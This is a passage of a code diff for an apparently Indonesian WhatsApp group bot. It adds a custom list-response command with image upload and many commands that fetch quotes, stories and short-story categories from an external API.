+                text: `${ucapanWaktu} @${sender.split("@")[0]}`,
+                buttonText: 'Click Here!',
+                footer: `*List ${groupName}*\n\n⏳ ${jam}\n📆 ${tanggal}`,
+                mentions: [sender],
+                sections: [{
+                    title: groupName, rows: arr_rows
+                }]
+            }
+            Fara.sendMessage(from, listMsg)
+            break
+        case 'addlist':
+            if (!m.isGroup) return m.reply(mess.group)
+            if (!isAdmins && !isCreator) return m.reply(mess.GrupAdmin)
+            var args1 = q.split("@")[0]
+            var args2 = q.split("@")[1]                
+            if (!q.includes("@")) return m.reply(`Gunakan dengan cara ${command} *key@response*\n\n_Contoh_\n\n${command} tes@apa`)
+            if (!isAlreadyResponList(from, args1, db_respon_list)) return m.reply(`List respon dengan key : *${args1}* sudah ada di group ini.`)
+            if (isImage || isQuotedImage) {
+                let media = await downloadAndSaveMediaMessage('image', `./sticker/${sender}`)
+                const fd = new FormData();
+                fd.append('file', fs.readFileSync(media), '.tmp', '.jpg')
+                fetch('https://telegra.ph/upload', {
+                    method: 'POST',
+                    body: fd
+                }).then(res => res.json())
+                    .then((json) => {
+                        addResponList(from, args1, args2, true, `https://telegra.ph${json[0].src}`, db_respon_list)
+                        m.reply(`Sukses set list message dengan key : *${args1}*`)
+                        if (fs.existsSync(media)) fs.unlinkSync(media)
+                    })
+            } else {
+                addResponList(from, args1, args2, false, '-', db_respon_list)
+                m.reply(`Sukses set list message dengan key : *${args1}*`)
+            }
+            break
+   //RANDOM TEXT
+case 'ceritahoror':
+            var { data } = await axios.get(`https://api.lolhuman.xyz/api/ceritahoror?apikey=${lolkey}`)
+            var caption = `Title : ${data.result.title}\n`
+            caption += `Desc : ${data.result.desc}\n`
+            caption += `Story :\n${data.result.story}\n`
+            Fara.sendMessage(from, { image: { url: data.result.thumbnail }, caption })
+            break        
+case 'cerpen':
+            var { data } = await axios.get(`https://api.lolhuman.xyz/api/cerpen?apikey=${lolkey}`)
+            var text = `Title : ${data.result.title}\n`
+            text += `Creator : ${data.result.creator}\n`
+            text += `Story :\n${data.result.cerpen}`
+            m.reply(text)
+            break 
+case 'quotes':
+            var { data } = await axios.get(`https://api.lolhuman.xyz/api/random/quotes?apikey=${lolkey}`)
+            m.reply(`_${data.result.quote}_\n\n*― ${data.result.by}*`)
+            break
+        case 'quotesanime':
+            var { data } = await axios.get(`https://api.lolhuman.xyz/api/random/quotesnime?apikey=${lolkey}`)
+            m.reply(`_${data.result.quote}_\n\n*― ${data.result.character}*\n*― ${data.result.anime} ${data.result.episode}*`)
+            break
+        case 'quotesdilan':
+            quotedilan = await axios.get(`https://api.lolhuman.xyz/api/quotes/dilan?apikey=${lolkey}`)
+            m.reply(quotedilan.result)
+            break
+        case 'faktaunik':
+        case 'katabijak':
+        case 'pantun':
+        case 'bucin':
+            var { data } = await axios.get(`https://api.lolhuman.xyz/api/random/${command}?apikey=${lolkey}`)
+            m.reply(data.result)
+            break
+        case 'randomnama':
+            var { data } = await axios.get(`https://api.lolhuman.xyz/api/random/nama?apikey=${lolkey}`)
+            m.reply(data.result)
+            break
+case 'lk21':
+            if (args.length == 0) return reply(`Example: ${prefix + command} Transformer`)
+            var { data } = await axios.get(`https://api.lolhuman.xyz/api/lk21?apikey=${lolkey}&query=${q}`)
+            var caption = `Title : ${data.result.title}\n`
+            caption += `Link : ${data.result.link}\n`
+            caption += `Genre : ${data.result.genre}\n`
+            caption += `Views : ${data.result.views}\n`
+            caption += `Duration : ${data.result.duration}\n`
+            caption += `Tahun : ${data.result.tahun}\n`
+            caption += `Rating : ${data.result.rating}\n`
+            caption += `Desc : ${data.result.desc}\n`
+            caption += `Actors : ${data.result.actors.join(', ')}\n`
+            caption += `Location : ${data.result.location}\n`
+            caption += `Date Release : ${data.result.date_release}\n`
+            caption += `Language : ${data.result.language}\n`
+            caption += `Link Download : ${data.result.link_dl}`
+            Fara.sendMessage(from, { image: { url: data.result.thumbnail }, caption })
+            break
+        case 'drakorongoing':
+            var { data } = await axios.get(`https://api.lolhuman.xyz/api/drakorongoing?apikey=${lolkey}`)
+            var text = 'Ongoing Drakor\n\n'
+            for (var x of data.result) {
+                text += `Title : ${x.title}\n`
+                text += `Link : ${x.link}\n`
+                text += `Thumbnail : ${x.thumbnail}\n`
+                text += `Year : ${x.category}\n`
+                text += `Total Episode : ${x.total_episode}\n`
+                text += `Genre : ${x.genre.join(', ')}\n\n`
+            }
+            reply(text)
+            break
+        case 'wattpad':
+            if (args.length == 0) return m.reply(`Example: ${prefix + command} https://www.wattpad.com/707367860-kumpulan-quote-tere-liye-tere-liye-quote-quote`)
+            var { data } = await axios.get(`https://api.lolhuman.xyz/api/wattpad?apikey=${lolkey}&url=${args[0]}`)
+            var caption = `Title : ${data.result.title}\n`
+            caption += `Rating : ${data.result.rating}\n`
+            caption += `Motify date : ${data.result.modifyDate}\n`
+            caption += `Create date: ${data.result.createDate}\n`
+            caption += `Word : ${data.result.word}\n`
+            caption += `Comment : ${data.result.comment}\n`
+            caption += `Vote : ${data.result.vote}\n`
+            caption += `Reader : ${data.result.reader}\n`
+            caption += `Pages : ${data.result.pages}\n`
+            caption += `Description : ${data.result.desc}\n\n`
+            caption += `Story : \n${data.result.story}`
+            Fara.sendMessage(from, { image: { url: data.result.photo }, caption })
+            break
+        case 'wattpadsearch':
+            if (args.length == 0) return m.reply(`Example: ${prefix + command} Tere Liye`)
+            var { data } = await axios.get(`https://api.lolhuman.xyz/api/wattpadsearch?apikey=${lolkey}&query=${q}`)
+            var text = 'Wattpad Seach : \n'
+            for (var x of data.result) {
+                text += `Title : ${x.title}\n`
+                text += `Url : ${x.url}\n`
+                text += `Part : ${x.parts}\n`
+                text += `Motify date : ${x.modifyDate}\n`
+                text += `Create date: ${x.createDate}\n`
+                text += `Coment count: ${x.commentCount}\n\n`
+            }
+            m.reply(text)
+            break
+        
+        ///CERPEN MENU
+case 'cerpen-anak':{
+
+let cerpe = await cerpen(`anak`)
+reply(`â­” _*Title :*_ ${cerpe.title}\nâ­” _*Author :*_ ${cerpe.author}\nâ­” _*Category :*_ ${cerpe.kategori}\nâ­” _*Pass Moderation :*_ ${cerpe.lolos}\nâ­” _*Story :*_\n${cerpe.cerita}`)
+}
+break
+case 'cerpen-bahasadaerah':{
+
+let cerpe = await cerpen(`bahasa daerah`)
+reply(`â­” _*Title :*_ ${cerpe.title}\nâ­” _*Author :*_ ${cerpe.author}\nâ­” _*Category :*_ ${cerpe.kategori}\nâ­” _*Pass Moderation :*_ ${cerpe.lolos}\nâ­” _*Story :*_\n${cerpe.cerita}`)
+}
+break
+case 'cerpen-bahasainggris':{
+
+let cerpe = await cerpen(`bahasa Inggris`)
+reply(`â­” _*Title :*_ ${cerpe.title}\nâ­” _*Author :*_ ${cerpe.author}\nâ­” _*Category :*_ ${cerpe.kategori}\nâ­” _*Pass Moderation :*_ ${cerpe.lolos}\nâ­” _*Story :*_\n${cerpe.cerita}`)
+}
+break
+case 'cerpen-bahasajawa':{
+
+let cerpe = await cerpen(`bahasa jawa`)
+reply(`â­” _*Title :*_ ${cerpe.title}\nâ­” _*Author :*_ ${cerpe.author}\nâ­” _*Category :*_ ${cerpe.kategori}\nâ­” _*Pass Moderation :*_ ${cerpe.lolos}\nâ­” _*Story :*_\n${cerpe.cerita}`)
+}
+break
+case 'cerpen-bahasasunda':{
+
+let cerpe = await cerpen(`bahasa sunda`)
+reply(`â­” _*Title :*_ ${cerpe.title}\nâ­” _*Author :*_ ${cerpe.author}\nâ­” _*Category :*_ ${cerpe.kategori}\nâ­” _*Pass Moderation :*_ ${cerpe.lolos}\nâ­” _*Story :*_\n${cerpe.cerita}`)
+}
+break
+case 'cerpen-budaya':{
+
+let cerpe = await cerpen(`budaya`)
+reply(`â­” _*Title :*_ ${cerpe.title}\nâ­” _*Author :*_ ${cerpe.author}\nâ­” _*Category :*_ ${cerpe.kategori}\nâ­” _*Pass Moderation :*_ ${cerpe.lolos}\nâ­” _*Story :*_\n${cerpe.cerita}`)
+}
+break
+case 'cerpen-cinta':{
+
+let cerpe = await cerpen(`cinta`)
+reply(`â­” _*Title :*_ ${cerpe.title}\nâ­” _*Author :*_ ${cerpe.author}\nâ­” _*Category :*_ ${cerpe.kategori}\nâ­” _*Pass Moderation :*_ ${cerpe.lolos}\nâ­” _*Story :*_\n${cerpe.cerita}`)
+}
+break
+case 'cerpen-cintaislami':{
+
+let cerpe = await cerpen(`cinta islami`)
+reply(`â­” _*Title :*_ ${cerpe.title}\nâ­” _*Author :*_ ${cerpe.author}\nâ­” _*Category :*_ ${cerpe.kategori}\nâ­” _*Pass Moderation :*_ ${cerpe.lolos}\nâ­” _*Story :*_\n${cerpe.cerita}`)
+}
+break
+case 'cerpen-cintapertama':{
+
+let cerpe = await cerpen(`cinta pertama`)
+reply(`â­” _*Title :*_ ${cerpe.title}\nâ­” _*Author :*_ ${cerpe.author}\nâ­” _*Category :*_ ${cerpe.kategori}\nâ­” _*Pass Moderation :*_ ${cerpe.lolos}\nâ­” _*Story :*_\n${cerpe.cerita}`)
+}
+break
+case 'cerpen-cintaromantis':{
+
+let cerpe = await cerpen(`cinta romantis`)
+reply(`â­” _*Title :*_ ${cerpe.title}\nâ­” _*Author :*_ ${cerpe.author}\nâ­” _*Category :*_ ${cerpe.kategori}\nâ­” _*Pass Moderation :*_ ${cerpe.lolos}\nâ­” _*Story :*_\n${cerpe.cerita}`)
+}
+break
+case 'cerpen-cintasedih':{
+
+let cerpe = await cerpen(`cinta sedih`)
+reply(`â­” _*Title :*_ ${cerpe.title}\nâ­” _*Author :*_ ${cerpe.author}\nâ­” _*Category :*_ ${cerpe.kategori}\nâ­” _*Pass Moderation :*_ ${cerpe.lolos}\nâ­” _*Story :*_\n${cerpe.cerita}`)
+}
+break
+case 'cerpen-cintasegitiga':{
+
+let cerpe = await cerpen(`Cinta segitiga`)
+reply(`â­” _*Title :*_ ${cerpe.title}\nâ­” _*Author :*_ ${cerpe.author}\nâ­” _*Category :*_ ${cerpe.kategori}\nâ­” _*Pass Moderation :*_ ${cerpe.lolos}\nâ­” _*Story :*_\n${cerpe.cerita}`)
+}
+break
+case 'cerpen-cintasejati':{
+
+let cerpe = await cerpen(`cinta sejati`)
+reply(`â­” _*Title :*_ ${cerpe.title}\nâ­” _*Author :*_ ${cerpe.author}\nâ­” _*Category :*_ ${cerpe.kategori}\nâ­” _*Pass Moderation :*_ ${cerpe.lolos}\nâ­” _*Story :*_\n${cerpe.cerita}`)
+}
+break
+case 'cerpen-galau':{
+
+let cerpe = await cerpen(`galau`)
+reply(`â­” _*Title :*_ ${cerpe.title}\nâ­” _*Author :*_ ${cerpe.author}\nâ­” _*Category :*_ ${cerpe.kategori}\nâ­” _*Pass Moderation :*_ ${cerpe.lolos}\nâ­” _*Story :*_\n${cerpe.cerita}`)
+}
+break
+case 'cerpen-gokil':{
+
+let cerpe = await cerpen(`gokil`)
+reply(`â­” _*Title :*_ ${cerpe.title}\nâ­” _*Author :*_ ${cerpe.author}\nâ­” _*Category :*_ ${cerpe.kategori}\nâ­” _*Pass Moderation :*_ ${cerpe.lolos}\nâ­” _*Story :*_\n${cerpe.cerita}`)
+}
+break
+case 'cerpen-inspiratif':{
+
+let cerpe = await cerpen(`inspiratif`)
+reply(`â­” _*Title :*_ ${cerpe.title}\nâ­” _*Author :*_ ${cerpe.author}\nâ­” _*Category :*_ ${cerpe.kategori}\nâ­” _*Pass Moderation :*_ ${cerpe.lolos}\nâ­” _*Story :*_\n${cerpe.cerita}`)
+}
+break
+case 'cerpen-jepang':{
+
+let cerpe = await cerpen(`jepang`)
+reply(`â­” _*Title :*_ ${cerpe.title}\nâ­” _*Author :*_ ${cerpe.author}\nâ­” _*Category :*_ ${cerpe.kategori}\nâ­” _*Pass Moderation :*_ ${cerpe.lolos}\nâ­” _*Story :*_\n${cerpe.cerita}`)
+}
+break
+case 'cerpen-kehidupan':{
+
+let cerpe = await cerpen(`kehidupan`)
+reply(`â­” _*Title :*_ ${cerpe.title}\nâ­” _*Author :*_ ${cerpe.author}\nâ­” _*Category :*_ ${cerpe.kategori}\nâ­” _*Pass Moderation :*_ ${cerpe.lolos}\nâ­” _*Story :*_\n${cerpe.cerita}`)
+}
+break
+case 'cerpen-keluarga':{
+
+let cerpe = await cerpen(`keluarga`)
+reply(`â­” _*Title :*_ ${cerpe.title}\nâ­” _*Author :*_ ${cerpe.author}\nâ­” _*Category :*_ ${cerpe.kategori}\nâ­” _*Pass Moderation :*_ ${cerpe.lolos}\nâ­” _*Story :*_\n${cerpe.cerita}`)
+}
+break
+case 'cerpen-kisahnyata':{
+
+let cerpe = await cerpen(`kisah nyata`)
+reply(`â­” _*Title :*_ ${cerpe.title}\nâ­” _*Author :*_ ${cerpe.author}\nâ­” _*Category :*_ ${cerpe.kategori}\nâ­” _*Pass Moderation :*_ ${cerpe.lolos}\nâ­” _*Story :*_\n${cerpe.cerita}`)
+}
+break
+case 'cerpen-korea':{
+
+let cerpe = await cerpen(`korea`)
+reply(`â­” _*Title :*_ ${cerpe.title}\nâ­” _*Author :*_ ${cerpe.author}\nâ­” _*Category :*_ ${cerpe.kategori}\nâ­” _*Pass Moderation :*_ ${cerpe.lolos}\nâ­” _*Story :*_\n${cerpe.cerita}`)
+}
+break
+case 'cerpen-kristen':{
+
+let cerpe = await cerpen(`kristen`)
+reply(`â­” _*Title :*_ ${cerpe.title}\nâ­” _*Author :*_ ${cerpe.author}\nâ­” _*Category :*_ ${cerpe.kategori}\nâ­” _*Pass Moderation :*_ ${cerpe.lolos}\nâ­” _*Story :*_\n${cerpe.cerita}`)
+}
+break
+case 'cerpen-liburan':{
+let cerpe = await cerpen(`liburan`)
+reply(`â­” _*Title :*_ ${cerpe.title}\nâ­” _*Author :*_ ${cerpe.author}\nâ­” _*Category :*_ ${cerpe.kategori}\nâ­” _*Pass Moderation :*_ ${cerpe.lolos}\nâ­” _*Story :*_\n${cerpe.cerita}`)
+}
+break
+case 'cerpen-malaysia':{
+let cerpe = await cerpen(`malaysia`)
+reply(`â­” _*Title :*_ ${cerpe.title}\nâ­” _*Author :*_ ${cerpe.author}\nâ­” _*Category :*_ ${cerpe.kategori}\nâ­” _*Pass Moderation :*_ ${cerpe.lolos}\nâ­” _*Story :*_\n${cerpe.cerita}`)
+}
+break
+case 'cerpen-mengharukan':{
+let cerpe = await cerpen(`mengharukan`)
+reply(`â­” _*Title :*_ ${cerpe.title}\nâ­” _*Author :*_ ${cerpe.author}\nâ­” _*Category :*_ ${cerpe.kategori}\nâ­” _*Pass Moderation :*_ ${cerpe.lolos}\nâ­” _*Story :*_\n${cerpe.cerita}`)
+}
+break
+case 'cerpen-misteri':{
+let cerpe = await cerpen(`misteri`)
+reply(`â­” _*Title :*_ ${cerpe.title}\nâ­” _*Author :*_ ${cerpe.author}\nâ­” _*Category :*_ ${cerpe.kategori}\nâ­” _*Pass Moderation :*_ ${cerpe.lolos}\nâ­” _*Story :*_\n${cerpe.cerita}`)
+}
+break
+case 'cerpen-motivasi':{
+let cerpe = await cerpen(`motivasi`)
+reply(`â­” _*Title :*_ ${cerpe.title}\nâ­” _*Author :*_ ${cerpe.author}\nâ­” _*Category :*_ ${cerpe.kategori}\nâ­” _*Pass Moderation :*_ ${cerpe.lolos}\nâ­” _*Story :*_\n${cerpe.cerita}`)
+}
+break
+case 'cerpen-nasihat':{
+let cerpe = await cerpen(`nasihat`)
+reply(`â­” _*Title :*_ ${cerpe.title}\nâ­” _*Author :*_ ${cerpe.author}\nâ­” _*Category :*_ ${cerpe.kategori}\nâ­” _*Pass Moderation :*_ ${cerpe.lolos}\nâ­” _*Story :*_\n${cerpe.cerita}`)
+}
+break
+case 'cerpen-nasionalisme':{
+let cerpe = await cerpen(`nasionalisme`)
+reply(`â­” _*Title :*_ ${cerpe.title}\nâ­” _*Author :*_ ${cerpe.author}\nâ­” _*Category :*_ ${cerpe.kategori}\nâ­” _*Pass Moderation :*_ ${cerpe.lolos}\nâ­” _*Story :*_\n${cerpe.cerita}`)
+}
+break
+case 'cerpen-olahraga':{
+let cerpe = await cerpen(`olahraga`)
+reply(`â­” _*Title :*_ ${cerpe.title}\nâ­” _*Author :*_ ${cerpe.author}\nâ­” _*Category :*_ ${cerpe.kategori}\nâ­” _*Pass Moderation :*_ ${cerpe.lolos}\nâ­” _*Story :*_\n${cerpe.cerita}`)
+}
+break
+case 'cerpen-patahhati':{
+let cerpe = await cerpen(`patah hati`)
+reply(`â­” _*Title :*_ ${cerpe.title}\nâ­” _*Author :*_ ${cerpe.author}\nâ­” _*Category :*_ ${cerpe.kategori}\nâ­” _*Pass Moderation :*_ ${cerpe.lolos}\nâ­” _*Story :*_\n${cerpe.cerita}`)
+}
+break
+case 'cerpen-penantian':{
+let cerpe = await cerpen(`penantian`)
+reply(`â­” _*Title :*_ ${cerpe.title}\nâ­” _*Author :*_ ${cerpe.author}\nâ­” _*Category :*_ ${cerpe.kategori}\nâ­” _*Pass Moderation :*_ ${cerpe.lolos}\nâ­” _*Story :*_\n${cerpe.cerita}`)
+}
+break
+case 'cerpen-pendidikan':{
+let cerpe = await cerpen(`pendidikan`)
+reply(`â­” _*Title :*_ ${cerpe.title}\nâ­” _*Author :*_ ${cerpe.author}\nâ­” _*Category :*_ ${cerpe.kategori}\nâ­” _*Pass Moderation :*_ ${cerpe.lolos}\nâ­” _*Story :*_\n${cerpe.cerita}`)
+}
+break
+case 'cerpen-pengalaman':{
+let cerpe = await cerpen(`pengalaman pribadi`)
+reply(`â­” _*Title :*_ ${cerpe.title}\nâ­” _*Author :*_ ${cerpe.author}\nâ­” _*Category :*_ ${cerpe.kategori}\nâ­” _*Pass Moderation :*_ ${cerpe.lolos}\nâ­” _*Story :*_\n${cerpe.cerita}`)
+}
+break
+case 'cerpen-pengorbanan':{
+let cerpe = await cerpen(`pengorbanan`)
+reply(`â­” _*Title :*_ ${cerpe.title}\nâ­” _*Author :*_ ${cerpe.author}\nâ­” _*Category :*_ ${cerpe.kategori}\nâ­” _*Pass Moderation :*_ ${cerpe.lolos}\nâ­” _*Story :*_\n${cerpe.cerita}`)
+}
+break
+case 'cerpen-penyesalan':{
+let cerpe = await cerpen(`penyesalan`)
+reply(`â­” _*Title :*_ ${cerpe.title}\nâ­” _*Author :*_ ${cerpe.author}\nâ­” _*Category :*_ ${cerpe.kategori}\nâ­” _*Pass Moderation :*_ ${cerpe.lolos}\nâ­” _*Story :*_\n${cerpe.cerita}`)
+}
+break
+case 'cerpen-perjuangan':{
+let cerpe = await cerpen(`perjuangan`)
+reply(`â­” _*Title :*_ ${cerpe.title}\nâ­” _*Author :*_ ${cerpe.author}\nâ­” _*Category :*_ ${cerpe.kategori}\nâ­” _*Pass Moderation :*_ ${cerpe.lolos}\nâ­” _*Story :*_\n${cerpe.cerita}`)
+}
+break
+case 'cerpen-perpisahan':{
+let cerpe = await cerpen(`perpisahan`)
+reply(`â­” _*Title :*_ ${cerpe.title}\nâ­” _*Author :*_ ${cerpe.author}\nâ­” _*Category :*_ ${cerpe.kategori}\nâ­” _*Pass Moderation :*_ ${cerpe.lolos}\nâ­” _*Story :*_\n${cerpe.cerita}`)
+}
+break
+case 'cerpen-persahabatan':{
+let cerpe = await cerpen(`persahabatan`)
+reply(`â­” _*Title :*_ ${cerpe.title}\nâ­” _*Author :*_ ${cerpe.author}\nâ­” _*Category :*_ ${cerpe.kategori}\nâ­” _*Pass Moderation :*_ ${cerpe.lolos}\nâ­” _*Story :*_\n${cerpe.cerita}`)
+}
+break
+case 'cerpen-petualangan':{
+let cerpe = await cerpen(`petualangan`)
+reply(`â­” _*Title :*_ ${cerpe.title}\nâ­” _*Author :*_ ${cerpe.author}\nâ­” _*Category :*_ ${cerpe.kategori}\nâ­” _*Pass Moderation :*_ ${cerpe.lolos}\nâ­” _*Story :*_\n${cerpe.cerita}`)
+}
+break
+case 'cerpen-ramadhan':{
+let cerpe = await cerpen(`ramadhan`)
+reply(`â­” _*Title :*_ ${cerpe.title}\nâ­” _*Author :*_ ${cerpe.author}\nâ­” _*Category :*_ ${cerpe.kategori}\nâ­” _*Pass Moderation :*_ ${cerpe.lolos}\nâ­” _*Story :*_\n${cerpe.cerita}`)
+}
+break
+case 'cerpen-remaja':{
+let cerpe = await cerpen(`remaja`)
+reply(`â­” _*Title :*_ ${cerpe.title}\nâ­” _*Author :*_ ${cerpe.author}\nâ­” _*Category :*_ ${cerpe.kategori}\nâ­” _*Pass Moderation :*_ ${cerpe.lolos}\nâ­” _*Story :*_\n${cerpe.cerita}`)
+}
+break
+case 'cerpen-rindu':{
+let cerpe = await cerpen(`rindu`)
+reply(`â­” _*Title :*_ ${cerpe.title}\nâ­” _*Author :*_ ${cerpe.author}\nâ­” _*Category :*_ ${cerpe.kategori}\nâ­” _*Pass Moderation :*_ ${cerpe.lolos}\nâ­” _*Story :*_\n${cerpe.cerita}`)
+}
+break
+case 'cerpen-rohani':{
+let cerpe = await cerpen(`rohani`)
+reply(`â­” _*Title :*_ ${cerpe.title}\nâ­” _*Author :*_ ${cerpe.author}\nâ­” _*Category :*_ ${cerpe.kategori}\nâ­” _*Pass Moderation :*_ ${cerpe.lolos}\nâ­” _*Story :*_\n${cerpe.cerita}`)
+}
+break
+case 'cerpen-romantis':{
+let cerpe = await cerpen(`romantis`)
+reply(`â­” _*Title :*_ ${cerpe.title}\nâ­” _*Author :*_ ${cerpe.author}\nâ­” _*Category :*_ ${cerpe.kategori}\nâ­” _*Pass Moderation :*_ ${cerpe.lolos}\nâ­” _*Story :*_\n${cerpe.cerita}`)
+}
+break
+case 'cerpen-sastra':{
+let cerpe = await cerpen(`sastra`)
+reply(`â­” _*Title :*_ ${cerpe.title}\nâ­” _*Author :*_ ${cerpe.author}\nâ­” _*Category :*_ ${cerpe.kategori}\nâ­” _*Pass Moderation :*_ ${cerpe.lolos}\nâ­” _*Story :*_\n${cerpe.cerita}`)
+}
+break
+case 'cerpen-sedih':{
+let cerpe = await cerpen(`sedih`)
+reply(`â­” _*Title :*_ ${cerpe.title}\nâ­” _*Author :*_ ${cerpe.author}\nâ­” _*Category :*_ ${cerpe.kategori}\nâ­” _*Pass Moderation :*_ ${cerpe.lolos}\nâ­” _*Story :*_\n${cerpe.cerita}`)
+}
+break
+case 'cerpen-sejarah':{
+let cerpe = await cerpen(`sejarah`)
+reply(`â­” _*Title :*_ ${cerpe.title}\nâ­” _*Author :*_ ${cerpe.author}\nâ­” _*Category :*_ ${cerpe.kategori}\nâ­” _*Pass Moderation :*_ ${cerpe.lolos}\nâ­” _*Story :*_\n${cerpe.cerita}`)
 }
 break
 //━━━━━━━━━━━━━━━[ AKHIR FITUR ]━━━━━━━━━━━━━━━━━//
